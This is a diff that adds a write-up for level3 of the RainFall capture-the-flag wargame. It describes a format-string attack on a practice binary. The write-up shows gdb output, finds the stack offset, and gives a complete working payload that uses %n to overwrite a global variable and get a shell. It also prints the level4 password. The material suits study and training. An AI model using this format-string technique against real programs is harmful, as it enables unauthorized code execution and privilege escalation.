@@ -1,0 +1,39 @@
+
+There is globally defined variable in programm.
+
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+...
+0x0804988c  m
+
+If its value is equal to 64, programm calls system("/bin/sh"), we could write to it becuase printf function has format string vulnarability (%n option). 
+
+level3@RainFall:~$ python
+Python 2.7.3 (default, Jun 22 2015, 19:43:34) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import struct
+>>> struct.pack("<I", 0x804988c)
+'\x8c\x98\x04\x08'
+
+Since we will use direct parameter acces, we need to find at what position argument is written (4th):
+
+level3@RainFall:~$ (python -c "print 'ADDR' +  '%p ' * 21 ") | ./level3
+ADDR0x200 0xb7fd1ac0 0xb7ff37d0 !!0x52444441!! 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa207025 (nil) 
+
+%n outputs number of bytes written so far, we write 4 bytes of address, that means width modifier will be equal to 60 = 64 -4
+
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"' ; cat - ) | ./level3
+�                                                         512
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+level3@RainFall:~$ su level4
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
